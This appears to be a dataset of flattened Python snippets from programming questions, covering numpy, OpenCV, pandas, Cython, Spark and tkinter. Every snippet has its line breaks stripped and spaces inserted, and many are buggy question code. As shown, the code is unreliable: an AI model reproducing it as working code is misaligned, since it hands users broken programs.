"# randomClass.pyimport numpy as npclass myClass ( self ) : def __init__ ( self , randomSt ) : print ( 'setup the object ' ) np.random.set_state ( randomSt ) def drawNumpySamples ( self , idx ) np.random.uniform ( ) # main.py import numpy as np from multiprocessing import Process , Manager from randomClass import myClass np.random.seed ( 1 ) # set random seed mng = Manager ( ) randomState = mng.list ( np.random.get_state ( ) ) myC = myClass ( randomSt = randomState ) for i in range ( 10 ) : myC.drawNumpySamples ( ) # this will always return the same results"
The command `` psql -U postgres -c 'CREATE EXTENSION plpythonu ; ' '' exited with 1.0.01s $ psql -U postgres -d test -c 'CREATE LANGUAGE plpythonu ; 'ERROR : could not access file `` $ libdir/plpython2 '' : No such file or directory addons : postgresql : `` 9.4 '' apt : packages : - postgresql-plpython-9.4
"import cv2import numpy as npimport matplotlib.pyplot as pltfrom scipy.ndimage import labelimport urllib.request # https : //stackoverflow.com/a/14617359/7690982def segment_on_dt ( a , img ) : border = cv2.dilate ( img , None , iterations=5 ) border = border - cv2.erode ( border , None ) dt = cv2.distanceTransform ( img , cv2.DIST_L2 , 3 ) plt.imshow ( dt ) plt.show ( ) dt = ( ( dt - dt.min ( ) ) / ( dt.max ( ) - dt.min ( ) ) * 255 ) .astype ( np.uint8 ) _ , dt = cv2.threshold ( dt , 140 , 255 , cv2.THRESH_BINARY ) lbl , ncc = label ( dt ) lbl = lbl * ( 255 / ( ncc + 1 ) ) # Completing the markers now . lbl [ border == 255 ] = 255 lbl = lbl.astype ( np.int32 ) cv2.watershed ( a , lbl ) print ( `` [ INFO ] { } unique segments found '' .format ( len ( np.unique ( lbl ) ) - 1 ) ) lbl [ lbl == -1 ] = 0 lbl = lbl.astype ( np.uint8 ) return 255 - lbl # Open Imageresp = urllib.request.urlopen ( `` https : //i.stack.imgur.com/YUgob.jpg '' ) img = np.asarray ( bytearray ( resp.read ( ) ) , dtype= '' uint8 '' ) img = cv2.imdecode ( img , cv2.IMREAD_COLOR ) # # Yellow slicermask = cv2.inRange ( img , ( 0 , 0 , 0 ) , ( 55 , 255 , 255 ) ) imask = mask > 0slicer = np.zeros_like ( img , np.uint8 ) slicer [ imask ] = img [ imask ] # Image Binarizationimg_gray = cv2.cvtColor ( slicer , cv2.COLOR_BGR2GRAY ) _ , img_bin = cv2.threshold ( img_gray , 140 , 255 , cv2.THRESH_BINARY ) # Morphological Gradientimg_bin = cv2.morphologyEx ( img_bin , cv2.MORPH_OPEN , np.ones ( ( 3 , 3 ) , dtype=int ) ) # Segmentationresult = segment_on_dt ( img , img_bin ) plt.imshow ( np.hstack ( [ result , img_gray ] ) , cmap='Set3 ' ) plt.show ( ) # Final Pictureresult [ result ! = 255 ] = 0result = cv2.dilate ( result , None ) img [ result == 255 ] = ( 0 , 0 , 255 ) plt.imshow ( result ) plt.show ( )"
1*242*122*2*62*3*42*2*2*33*84*6
"> > > from struct import * > > > fmt = 'hhl ' > > > values = [ 1,2,3 ] > > > blob = pack ( fmt , values ) > > > calcsize ( fmt ) > > > calcentries ( fmt ) 3"
inline = blip.GetDocument ( ) .InsertInlineBlip ( positionInText ) inline.GetDocument ( ) .SetText ( `` some text '' )
"> > > history above belowasn country12345 US 5 4 MX 6 354321 MX 4 5 > > > current above belowasn country12345 MX 1 054321 MX 0 1 US 1 0 > > > history = history.add ( current , fill_value=0 ) > > > history above belowasn country 12345 MX 7.0 3.0 US 5.0 4.054321 MX 4.0 6.0 US 1.0 0.0 > > > current above below cruftasn country12345 MX 1 0 99954321 MX 0 1 999 US 1 0 999 > > > history = history.add ( current , fill_value=0 ) > > > history above below cruftasn country 12345 MX 7.0 3.0 999.0 US 5.0 4.0 NaN54321 MX 4.0 6.0 999.0 US 1.0 0.0 999.0 > > > history above belowasn country 12345 MX 7.0 3.0 US 5.0 4.054321 MX 4.0 6.0 US 1.0 0.0"
"s = 'k1 : some text k2 : more text k3 : and still more'key_list = [ 'k1 ' , 'k2 ' , 'k3 ' ] ( missing code ) # s_dict = { 'k1 ' : 'some text ' , 'k2 ' : 'more text ' , 'k3 ' : 'and still more ' }"
for a in map : for b in map [ a ] : for c in map [ b ] : for d in map [ c ] : for e in map [ d ] : print a+b+c+d+e
"data_dict = { 'key1 ' : value1 , 'key2 ' : value2 , 'key3 ' : value3 , } class MyModel ( models.Model ) : key1 = models.SomeField ( ) key2 = models.SomeField ( ) m = MyModel.objects.create ( **data_dict ) m = MyModel.objects.create ( key1 = data_dict [ 'key1 ' ] , key2 = data_dict [ 'key2 ' ] , )"
"any = Word ( printables ) conditional = Forward ( ) sub_exp = ( conditional | any ) conditional = Literal ( ' ( ' ) + sub_exp + Literal ( ' ? ' ) + sub_exp + Literal ( ' : ' ) + sub_exp + Literal ( ' ) ' ) for exp in conditional.scanString ( block_str ) : print exp lpar = Literal ( ' ( ' ) .suppress ( ) rpar = Literal ( ' ) ' ) .suppress ( ) any = Combine ( OneOrMore ( Word ( printables , excludeChars= ' ( ) ? : ' ) | White ( ' ' , max=1 ) ) ) expr = Forward ( ) atom = any | Group ( lpar + expr + Literal ( ' ? ' ) + expr + Literal ( ' : ' ) + expr + rpar ) expr < < Literal ( ' ( ' ) + atom + ZeroOrMore ( expr ) + Literal ( ' ? ' ) + atom + ZeroOrMore ( expr ) + Literal ( ' : ' ) + atom + ZeroOrMore ( expr ) + Literal ( ' ) ' ) for ternary_exp in expr.scanString ( block_str ) : print ternary_exp"
"import pandas as pdimport numpy as npnp.random.seed ( 42 ) feature = pd.DataFrame ( { 'ds ' : pd.date_range ( '20200101 ' , periods=100*24 , freq= ' H ' ) , ' y ' : np.random.randint ( 0,20 , 100*24 ) , 'yhat ' : np.random.randint ( 0,20 , 100*24 ) , 'price ' : np.random.choice ( [ 6600 , 7000 , 5500 , 7800 ] , 100*24 ) } ) import plotly.graph_objects as goimport plotly.offline as pyimport plotly.express as pxfrom plotly.offline import init_notebook_modeinit_notebook_mode ( connected=True ) y = feature.set_index ( 'ds ' ) .resample ( 'D ' ) [ ' y ' ] .sum ( ) fig = go.Figure ( ) fig.add_trace ( go.Scatter ( x=y.index , y=y ) ) x_dates = y.index.to_series ( ) .dt.strftime ( ' % Y- % m- % d ' ) .sort_values ( ) .unique ( ) layout = dict ( xaxis=dict ( tickmode= '' array '' , tickvals=np.arange ( 0 , x_dates.shape [ 0 ] ,2 ) .astype ( int ) , ticktext=x_dates [ : :2 ] , tickformat= ' % Y- % m- % d ' , tickangle=45 , ) ) fig.update_layout ( layout ) fig.show ( )"
> > > def foo ( a ) : print `` called the function '' if ( a==1 ) : return 1 else : return None > > > a=1 > > > if ( foo ( a ) ! = None and foo ( a ) ==1 ) : print `` asdf '' called the functioncalled the functionasdf
"import numpy as npY=np.array ( [ 2.3,3.5 , np.inf,4.4 , np.inf,2.5 ] ) idx=np.where ( Y==np.max ( Y [ np.isfinite ( Y ) ] ) ) [ 0 ] [ 0 ]"
"A B C0 6 2 -51 2 5 22 10 3 13 -5 2 84 3 6 2 out = df.apply ( tuple , 1 ) print ( out ) 0 ( 6 , 2 , -5 ) 1 ( 2 , 5 , 2 ) 2 ( 10 , 3 , 1 ) 3 ( -5 , 2 , 8 ) 4 ( 3 , 6 , 2 ) dtype : object out = df.apply ( list , 1 ) print ( out ) A B C0 6 2 -51 2 5 22 10 3 13 -5 2 84 3 6 2 out = pd.Series ( df.values.tolist ( ) ) print ( out ) 0 [ 6 , 2 , -5 ] 1 [ 2 , 5 , 2 ] 2 [ 10 , 3 , 1 ] 3 [ -5 , 2 , 8 ] 4 [ 3 , 6 , 2 ] dtype : object df_test = pd.concat ( [ df ] * 10000 , 0 ) % timeit pd.Series ( df.values.tolist ( ) ) # original workaround10000 loops , best of 3 : 161 µs per loop % timeit df.apply ( tuple , 1 ) .apply ( list , 1 ) # proposed by Alexander1000 loops , best of 3 : 615 µs per loop"
[ [ source ] ] name = `` pypi '' url = `` https : //pypi.org/simple '' verify_ssl = true [ dev-packages ] pytest = `` * '' [ packages ] requests = `` * '' [ requires ] python_version = `` 3.7 '' image : peque/python-develbefore_script : - pipenv sync -- devpython36 : script : - pipenv run pytest
"# from pyspark.sql.types import StructType , StructField , IntegerType # minutes = spark.sparkContext\ # .parallelize ( ( ( 0 , 60 ) , # ( 60 , 120 ) ) ) \ # .toDF ( StructType ( [ # StructField ( 'minute_start ' , IntegerType ( ) ) , # StructField ( 'minute_end ' , IntegerType ( ) ) # ] ) ) # events = spark.sparkContext\ # .parallelize ( ( ( 12 , 33 ) , # ( 0 , 120 ) , # ( 33 , 72 ) , # ( 65 , 178 ) ) ) \ # .toDF ( StructType ( [ # StructField ( 'event_start ' , IntegerType ( ) ) , # StructField ( 'event_end ' , IntegerType ( ) ) # ] ) ) events.hint ( `` range_join '' , `` 60 '' ) \ .join ( minutes , on= [ events.event_start < minutes.minute_end , minutes.minute_start < events.event_end ] ) \ .orderBy ( events.event_start , events.event_end , minutes.minute_start ) \ .show ( ) + -- -- -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- +|event_start|event_end|minute_start|minute_end|+ -- -- -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- +| 0| 120| 0| 60|| 0| 120| 60| 120|| 12| 33| 0| 60|| 33| 72| 0| 60|| 33| 72| 60| 120|| 65| 178| 60| 120|+ -- -- -- -- -- -+ -- -- -- -- -+ -- -- -- -- -- -- + -- -- -- -- -- + AnalysisException : 'Range join hint : invalid arguments Buffer ( 60 ) ; ' def hint ( self , name , *parameters ) : ... ( no checks on ` parameters ` up to here ) allowed_types = ( basestring , list , float , int ) for p in parameters : if not isinstance ( p , allowed_types ) : raise TypeError ( `` all parameters should be in { 0 } , got { 1 } of type { 2 } '' .format ( allowed_types , p , type ( p ) ) ) ... ( no checks beyond this point )"
"# importing c++ templatecdef extern from `` test.cpp '' : void inPlaceParallelSort [ T ] ( T* arrayPointer , int arrayLength ) def sortNumpyArray ( np.ndarray a ) : # This obviously will not work , but I do n't know how to make it work . inPlaceParallelSort ( a.data , len ( a ) )"
"cdef struct Node : int v Node* next Node* predef f ( int N ) : cdef : vector [ Node* ] narray int i narray.assign ( N , 0 ) for i in xrange ( N ) : narray [ i ] = 0 Error compiling Cython file : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- ... cdef : vector [ Node* ] narray int i narray.assign ( N , 0 ) for i in xrange ( N ) : narray [ i ] = 0 ^ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- testLinkList.pyx:107:14 : Compiler crash in AnalyseExpressionsTransform"
"def execCode ( code , testScript=None ) : # create file-like string to capture output codeOut = io.StringIO ( ) codeErr = io.StringIO ( ) # capture output and errors sys.stdout = codeOut sys.stderr = codeErr def worker ( ) : exec ( code , globals ( ) ) if testScript : # flush stdout/stderror sys.stdout.truncate ( 0 ) sys.stdout.seek ( 0 ) # sys.stderr.truncate ( 0 ) # sys.stderr.seek ( 0 ) exec ( testScript ) thread = threading.Thread ( target=worker , daemon=True ) # thread = Process ( target=worker ) # , stdout=codeOut , stderr=codeErr ) thread.start ( ) thread.join ( 0.5 ) # 500ms execError = codeErr.getvalue ( ) .strip ( ) execOutput = codeOut.getvalue ( ) .strip ( ) if thread.is_alive ( ) : thread.terminate ( ) execError = `` TimeError : run time exceeded '' codeOut.close ( ) codeErr.close ( ) # restore stdout and stderr sys.stdout = sys.__stdout__ sys.stderr = sys.__stderr__ # restore any overridden functions restoreBuiltinFunctions ( ) if execError : return False , stripOuterException ( execError ) else : return True , execOutput def preprocess ( code ) : import re rx = re.compile ( 'earlier_date\s*=\s*.+ ' ) code = re.sub ( rx , `` earlier_date = date ( 2016 , 5 , 3 ) '' , code ) rx = re.compile ( 'later_date\s*=\s*.+ ' ) code = re.sub ( rx , `` later_date = date ( 2016 , 5 , 24 ) '' , code ) return code"
"setup ( cmdclass = { 'build_ext ' : build_ext } , ext_modules = ext_modules , include_dirs= [ numpy.get_include ( ) ] )"
> > > import numpy as np > > > np.all ( xrange ( 10 ) ) False > > > np.all ( i for i in xrange ( 10 ) ) True
"Input : BangOutput : [ [ ' B ' , 'ang ' ] , [ 'Ba ' , 'ng ' ] , [ 'Ban ' , ' g ' ] , [ ' B ' , ' a ' , 'ng ' ] , [ ' B ' , 'an ' , ' g ' ] , [ 'Ba ' , ' n ' , ' g ' ] , [ ' B ' , ' a ' , ' n ' , ' g ' ] ] list ( permutations ( 'Bang ' , 3 ) ) [ [ word [ : i ] , word [ i : ] ] for i in range ( 1 , len ( word ) ) ]"
"[ { 'word ' : 'The ' , 'next ' : [ { 'word ' : 'End ' , 'next ' : None } , { 'word ' : 'quick ' , 'next ' : [ { 'word ' : 'brown ' , 'next ' : [ { 'word ' : 'fox ' , 'next ' : None } ] } ] } , { 'word ' : 'best ' , 'next ' : [ { 'word ' : 'of ' , 'next ' : [ { 'word ' : 'times ' , 'next ' : None } ] } ] } ] } ] [ [ { 'word ' : 'The ' } , { 'word ' : 'End ' } ] , [ { 'word ' : 'The ' } , { 'word ' : 'quick ' } , { 'word ' : 'brown ' } , { 'word ' : 'fox ' } ] , [ { 'word ' : 'The ' } , { 'word ' : 'best ' } , { 'word ' : 'of ' } , { 'word ' : 'times ' } ] ] def flatten_combinations ( result_tree , current_combo = None , all_combos = None ) : if current_combo is None : current_combo = [ ] if all_combos is None : all_combos = [ ] if result_tree is None : all_combos.append ( current_combo ) return for word in result_tree : current_combo.append ( { 'word ' : word [ 'word ' ] } ) flatten_combinations ( word [ 'next ' ] , current_combo , all_combos ) return current_combo [ { 'word ' : 'The ' } , { 'word ' : 'End ' } , { 'word ' : 'quick ' } , { 'word ' : 'brown ' } , { 'word ' : 'fox ' } , { 'word ' : 'best ' } , { 'word ' : 'of ' } , { 'word ' : 'times ' } ] def flatten_combinations ( result_tree , current_combo = None , all_combos = None ) : if current_combo is None : current_combo = [ ] if all_combos is None : all_combos = [ ] if result_tree is None : all_combos.append ( current_combo ) return for word in result_tree : current_combo = current_combo [ : ] current_combo.append ( { 'word ' : word [ 'word ' ] } ) flatten_combinations ( word [ 'next ' ] , current_combo , all_combos ) return all_combos [ { 'word ' : 'The ' } , { 'word ' : 'End ' } ] , [ { 'word ' : 'The ' } , { 'word ' : 'End ' } , { 'word ' : 'quick ' } , { 'word ' : 'brown ' } , { 'word ' : 'fox ' } ] , [ { 'word ' : 'The ' } , { 'word ' : 'End ' } , { 'word ' : 'quick ' } , { 'word ' : 'best ' } , { 'word ' : 'of ' } , { 'word ' : 'times ' } ] ]"
"def nancorr ( ndarray [ float64_t , ndim=2 ] mat , bint cov=0 , minp=None ) : # ... N , K = ( < object > mat ) .shape from cython cimport Py_ssize_timport numpy as npfrom numpy cimport ndarray , float64_tcimport numpy as cnpcnp.import_array ( ) def test_castobj ( ndarray [ float64_t , ndim=2 ] arr ) : cdef : Py_ssize_t b1 , b2 # Tuple unpacking - this will fail at compile b1 , b2 = arr.shape return b1 , b2 def test_castobj ( ndarray [ float64_t , ndim=2 ] arr ) : cdef : # Py_ssize_t b1 , b2 ndarray [ float64_t , ndim=2 ] zeros zeros = np.zeros ( arr.shape , dtype=np.float64 ) return zeros def test_castobj ( ndarray [ float64_t , ndim=2 ] arr ) : `` '' '' This works '' '' '' cdef : Py_ssize_t b1 , b2 ndarray [ float64_t , ndim=2 ] zeros b1 , b2 = ( < object > arr ) .shape zeros = np.zeros ( ( < object > arr ) .shape , dtype=np.float64 ) return b1 , b2 , zeros def test_castobj ( object [ float64_t , ndim=2 ] arr ) : cdef : tuple shape = arr.shape ndarray [ float64_t , ndim=2 ] zeros zeros = np.zeros ( shape , dtype=np.float64 ) return zeros > > > from shape import test_castobj > > > arr = np.arange ( 6 , dtype=np.float64 ) .reshape ( 2 , 3 ) > > > test_castobj ( arr ) ( 2 , 3 , array ( [ [ 0. , 0. , 0 . ] , [ 0. , 0. , 0 . ] ] ) ) cpdef int sum3d ( int [ : , : , : ] arr ) nogil : cdef size_t i , j , k cdef int total = 0 I = arr.shape [ 0 ] J = arr.shape [ 1 ] K = arr.shape [ 2 ] def test_castobj ( object [ float64_t , ndim=2 ] arr ) : cdef ndarray [ float64_t , ndim=2 ] zeros zeros = np.zeros ( arr.shape , dtype=np.float64 ) return zeros"
A.shape [ axis ] = n+1 . B.shape [ axis ] = C.shape [ axis ] = n
"from tkinter import *root = Tk ( ) root.title ( 'My app ' ) root.minsize ( 250 , 100 ) label1 = Label ( root , text = 'Hello world ! ' , fg = 'red ' , bg = 'yellow ' , font = 'Monaco ' ) label1.pack ( fill = X ) label2 = Label ( root , text = 'Some more text ! ' , fg = 'green ' , bg = 'cyan ' , font = 'Arial ' ) label2.pack ( fill = Y ) root.mainloop ( )"
"class MyClass : all_instances = { } # this dictionary is in local space and it 's clear that # the only interaction is with MyClass def __init__ ( self , unique_id , x , y , z ) : if unique_id not in MyClass.all_instances : self.unique_id = unique_id self.x = x self.y = y self.z = z MyClass.all_instances [ unique_id ] = self else : self = MyClass.all_instances [ unique_id ] self.update ( x , y , z ) def update ( self , new_x , new_y , new_z ) : self.x = self.do_something_with ( self.x , new_x ) self.y = self.do_something_with ( self.y , new_y ) self.z = self.do_something_with ( self.z , new_z ) @ staticmethod def do_something_with ( old_value , new_value ) : # do something with old value and new and return some value value = ( old_value + new_value ) / 2 # more complicated than tht return valuewhile True : for id in get_ids ( ) : # fetch ids from some database x , y , z = get_values ( id ) # fetch values from some other database MyClass ( id , x , y , z ) class MyClass : def __init__ ( self , x , y , z ) : self.x = x self.y = y self.z = z def update ( self , new_x , new_y , new_z ) : self.x = self.do_something_with ( self.x , new_x ) self.y = self.do_something_with ( self.y , new_y ) self.z = self.do_something_with ( self.z , new_z ) @ staticmethod def do_something_with ( old_value , new_value ) : # do something with old value and new and return some value value = ( old_value + new_value ) / 2 # more complicated than tht return valueall_instances = { } # this dictionary is now in global space # and it 's unclear if the only interaction is with MyClasswhile True : for id in get_ids ( ) : # fetch ids from some database x , y , z = get_values ( id ) # fetch values from some other database if id not in all_instances : all_instances [ id ] = MyClass ( x , y , z ) else : all_instances [ id ] .update ( x , y , z )"
"In [ 2 ] : def do ( ) : ... : try : ... : raise ValueError ( 'yofoo ' ) ... : except TypeError , ValueError : ... : raise ValueError ( 'yo ' ) ... : In [ 3 ] : do ( ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -UnboundLocalError Traceback ( most recent call last ) < ipython-input-3-30c46b84d9a4 > in < module > ( ) -- -- > 1 do ( ) < ipython-input-2-b62158d6343b > in do ( ) 1 def do ( ) : 2 try : -- -- > 3 raise ValueError ( 'yofoo ' ) 4 except TypeError , ValueError : 5 raise ValueError ( 'yo ' ) UnboundLocalError : local variable 'ValueError ' referenced before assignment In [ 3 ] : try : ... : raise ValueError ( `` foo '' ) ... : except ValueError : ... : raise ValueError ( `` bar '' ) ... : -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-3-d5c83419a5ea > in < module > ( ) 2 raise ValueError ( `` foo '' ) 3 except ValueError : -- -- > 4 raise ValueError ( `` bar '' ) 5 ValueError : bar"
"> > > a = np.random.randint ( 0 , 10 , ( 3 , 3 ) ) > > > aarray ( [ [ 6 , 7 , 4 ] , [ 5 , 4 , 8 ] , [ 1 , 3 , 4 ] ] ) > > > b = np.roll ( a , 1 , axis=0 ) > > > barray ( [ [ 1 , 3 , 4 ] , [ 6 , 7 , 4 ] , [ 5 , 4 , 8 ] ] ) > > > b [ 2,2 ] = 99 > > > barray ( [ [ 1 , 3 , 4 ] , [ 6 , 7 , 4 ] , [ 5 , 4 , 99 ] ] ) > > > aarray ( [ [ 6 , 7 , 4 ] , [ 5 , 4 , 8 ] , [ 1 , 3 , 4 ] ] ) > > > aarray ( [ [ 6 , 7 , 4 ] , [ 5 , 4 , 99 ] , # observe as ` 8 ` has been changed here too ! [ 1 , 3 , 4 ] ] )"
def factorial ( n ) : if n == 1 : return n else : return n * factorial ( n-1 ) class Foo ( object ) : a = FooNameError : name 'Foo ' is not defined class Foo ( object ) : def __init__ ( self ) : a = Foo
"123 +- 1 -- -- precision 1 -- -- - > 123 ( 1 ) 123 +- 1.1 -- -- precision 2 -- -- - > 123.0 ( 11 ) 0.0123 +- 0.001 -- -- precision 1 -- -- - > 0.012 ( 1 ) 123.111 +- 0.123 -- -- precision 2 -- -- - > 123.11 ( 12 ) # ! /usr/bin/env python # *-* coding : utf-8 *-*from math import floor , log10 # uncertainty to stringdef un2str ( x , xe , precision=2 ) : `` '' '' pretty print nominal value and uncertainty x - nominal value xe - uncertainty precision - number of significant digits in uncertainty returns shortest string representation of ` x +- xe ` either as x.xx ( ee ) e+xx or as xxx.xx ( ee ) '' '' '' # base 10 exponents x_exp = int ( floor ( log10 ( x ) ) ) xe_exp = int ( floor ( log10 ( xe ) ) ) # uncertainty un_exp = xe_exp-precision+1 un_int = round ( xe*10** ( -un_exp ) ) # nominal value no_exp = un_exp no_int = round ( x*10** ( -no_exp ) ) # format - nom ( unc ) exp fieldw = x_exp - no_exp fmt = ' % % . % df ' % fieldw result1 = ( fmt + ' ( % .0f ) e % d ' ) % ( no_int*10** ( -fieldw ) , un_int , x_exp ) # format - nom ( unc ) fieldw = max ( 0 , -no_exp ) fmt = ' % % . % df ' % fieldw result2 = ( fmt + ' ( % .0f ) ' ) % ( no_int*10**no_exp , un_int*10**max ( 0 , un_exp ) ) # return shortest representation if len ( result2 ) < = len ( result1 ) : return result2 else : return result1if __name__ == `` __main__ '' : xs = [ 123456 , 12.34567 , 0.123456 , 0.001234560000 , 0.0000123456 ] xes = [ 123 , 0.00123 , 0.000123 , 0.000000012345 , 0.0000001234 ] precs = [ 1 , 2 , 3 , 4 , 1 ] for ( x , xe , prec ) in zip ( xs , xes , precs ) : print ' % .6e +- % .6e @ % d -- > % s ' % ( x , xe , prec , un2str ( x , xe , prec ) ) 1.234560e+05 +- 1.230000e+02 @ 1 -- > 1.235 ( 1 ) e51.234567e+01 +- 1.230000e-03 @ 2 -- > 12.3457 ( 12 ) 1.234560e-01 +- 1.230000e-04 @ 3 -- > 0.123456 ( 123 ) 1.234560e-03 +- 1.234500e-08 @ 4 -- > 0.00123456000 ( 1235 ) 1.234560e-05 +- 1.234000e-07 @ 1 -- > 1.23 ( 1 ) e-5"
# 112 - > http : //mytracsite/tickets/112r1023 - > http : //mytracsite/changeset/1023
def gen ( ) : while True : x = ( yield ) if x == 3 : print ( 'received 3 ! ! ' ) break else : yield x def gen2 ( ) : while True : yield ( yield ) g = gen2 ( ) next ( g ) g.send ( 10 ) # output : 10g.send ( 2 ) # output : nothingg.send ( 3 ) # output : 3g.send ( 44 ) # output : nothing
"import parserimport astfrom math import sin , cos , tanformulas = [ `` 1+2 '' , `` 1+2*3 '' , `` 1/2 '' , `` ( 1+2 ) *3 '' , `` sin ( x ) *x**2 '' , `` cos ( x ) '' , `` True and False '' , `` sin ( w*time ) '' ] class v ( ast.NodeVisitor ) : def __init__ ( self ) : self.tokens = [ ] def f_continue ( self , node ) : super ( v , self ) .generic_visit ( node ) def visit_Add ( self , node ) : self.tokens.append ( '+ ' ) self.f_continue ( node ) def visit_And ( self , node ) : self.tokens.append ( ' & & ' ) self.f_continue ( node ) def visit_BinOp ( self , node ) : # print ( 'visit_BinOp ' ) # for child in ast.iter_fields ( node ) : # print ( ' child % s ' % str ( child ) ) self.f_continue ( node ) def visit_BoolOp ( self , node ) : # print ( 'visit_BoolOp ' ) self.f_continue ( node ) def visit_Call ( self , node ) : # print ( 'visit_Call ' ) self.f_continue ( node ) def visit_Div ( self , node ) : self.tokens.append ( '/ ' ) self.f_continue ( node ) def visit_Expr ( self , node ) : # print ( 'visit_Expr ' ) self.f_continue ( node ) def visit_Import ( self , stmt_import ) : for alias in stmt_import.names : print ( 'import name `` % s '' ' % alias.name ) print ( 'import object % s ' % alias ) self.f_continue ( stmt_import ) def visit_Load ( self , node ) : # print ( 'visit_Load ' ) self.f_continue ( node ) def visit_Module ( self , node ) : # print ( 'visit_Module ' ) self.f_continue ( node ) def visit_Mult ( self , node ) : self.tokens.append ( '* ' ) self.f_continue ( node ) def visit_Name ( self , node ) : self.tokens.append ( node.id ) self.f_continue ( node ) def visit_NameConstant ( self , node ) : self.tokens.append ( node.value ) self.f_continue ( node ) def visit_Num ( self , node ) : self.tokens.append ( node.n ) self.f_continue ( node ) def visit_Pow ( self , node ) : self.tokens.append ( 'pow ' ) self.f_continue ( node ) for index , f in enumerate ( formulas ) : print ( ' { } - { : *^76 } '.format ( index , f ) ) visitor = v ( ) visitor.visit ( ast.parse ( f ) ) print ( visitor.tokens ) print ( ) # 0 - ************************************1+2************************************* # [ 1 , '+ ' , 2 ] # 1 - ***********************************1+2*3************************************ # [ 1 , '+ ' , 2 , '* ' , 3 ] # 2 - ************************************1/2************************************* # [ 1 , '/ ' , 2 ] # 3 - ********************************** ( 1+2 ) *3*********************************** # [ 1 , '+ ' , 2 , '* ' , 3 ] # 4 - ********************************sin ( x ) *x**2********************************* # [ 'sin ' , ' x ' , '* ' , ' x ' , 'pow ' , 2 ] # 5 - ***********************************cos ( x ) *********************************** # [ 'cos ' , ' x ' ] # 6 - *******************************True and False******************************* # [ ' & & ' , True , False ] # 7 - ********************************sin ( w*time ) ********************************* # [ 'sin ' , ' w ' , '* ' , 'time ' ]"
> > > from contextlib import contextmanager > > > @ contextmanager ... def foo ( ) : ... print 'setup ' ... try : ... yield ... finally : ... print 'cleanup ' ... > > > def bar ( ) : ... with foo ( ) : ... while True : ... yield 'bar ' ... > > > b = bar ( ) > > > b.next ( ) setup'bar ' > > > b = Nonecleanup
"# models.pyclass Artist ( db.Model ) : # ... tags = association_proxy ( '_tags ' , 'tag ' , creator=lambda t : ArtistTag ( tag=t ) ) # ... class Tag ( db.Model ) : # ... artist = association_proxy ( '_artists ' , 'artist ' , creator=lambda a : ArtistTag ( artist=a ) ) # ... class ArtistTag ( db.Model ) : # ... artist_id = db.Column ( db.Integer , ForeignKey ( 'artists.id ' ) ) artist = db.relationship ( 'Artist ' , backref='_tags ' ) tag_id = db.Column ( db.Integer , ForeignKey ( 'tags.id ' ) ) tag = db.relationship ( 'Tag ' , backref='_artists ' ) # api/tag.pyfrom flask.ext.restful import Resourcefrom ..class ListArtistTag ( Resource ) : def get ( self , id ) : # much safer in actual app return TagSchema ( many=True ) .dump ( Artist.query.get ( id ) .tags ) .data"
"List = [ ( 1,4 ) , ( 8,10 ) , ( 19,25 ) , ( 10,13 ) , ( 14,16 ) , ( 25,30 ) ]"
"x = [ 1,1,1,2,2,2,3,3,3,4,4,4,5,5,5 ] y = [ 8,7,5,4,3,7,8,3,2,1,9,11,16,18,19 ] import numpy as np , matplotlib.pyplot as pltfrom scipy.cluster.vq import kmeans , vqdata = np.array ( np.random.rand ( 100 ) ) plt.plot ( data , 'ob ' ) centroids , variances= kmeans ( data,3,10 ) indices , distances= vq ( data , centroids ) print ( centroids ) [ 0.82847854 0.49085422 0.18256191 ] plt.show ( )"
"x = np.full ( ( 2,2,50,100 ) , np.nan ) y = np.array ( [ 0,10,20 ] ) print ( x.shape ) ( 2,2,50,100 ) print ( x [ : , : , : ,y ] .shape ) ( 2,2,50,3 ) print ( x [ 0 , : , : , : ] .shape ) ( 2,50,100 ) print ( x [ 0 , : , : , y ] .shape ) ( 3,2,50 )"
"ax.spines [ 'top ' ] .set_visible ( False ) ax.spines [ 'right ' ] .set_visible ( False ) ax.spines [ 'bottom ' ] .set_visible ( False ) ax.spines [ 'left ' ] .set_visible ( False ) def plotPerfect ( df , spline ) : ax = df.plot ( ) if not spline : ax.spines [ 'top ' ] .set_visible ( False ) ax.spines [ 'right ' ] .set_visible ( False ) ax.spines [ 'bottom ' ] .set_visible ( False ) ax.spines [ 'left ' ] .set_visible ( False ) return ( ax ) plotPerfect ( df = df , spline = False ) # importsimport pandas as pdimport numpy as npfrom jupyterthemes import jtplot # Sample datanp.random.seed ( 123 ) rows = 50dfx = pd.DataFrame ( np.random.randint ( 90,110 , size= ( rows , 1 ) ) , columns= [ 'Variable Y ' ] ) dfy = pd.DataFrame ( np.random.randint ( 25,68 , size= ( rows , 1 ) ) , columns= [ ' Variable X ' ] ) df = pd.concat ( [ dfx , dfy ] , axis = 1 ) jtplot.style ( ) # Plot with default settingsdf.plot ( ) # Wrap df.plot ( ) and matplotlib spine in a functiondef plotPerfect ( df , spline ) : ax = df.plot ( ) if not spline : ax.spines [ 'top ' ] .set_visible ( False ) ax.spines [ 'right ' ] .set_visible ( False ) ax.spines [ 'bottom ' ] .set_visible ( False ) ax.spines [ 'left ' ] .set_visible ( False ) return ( ax ) # Plot the perfect time-series plotplotPerfect ( df = df , spline = False )"
d = { } i = 0for l in a_list : if ( l not in d ) and ( l ! = ' < ' ) : d [ l ] = i i += 1
"def f ( ) : a = 1 b = 2 list_ = [ ' a ' , ' b ' ] dict_ = { x : locals ( ) [ x ] for x in list_ }"
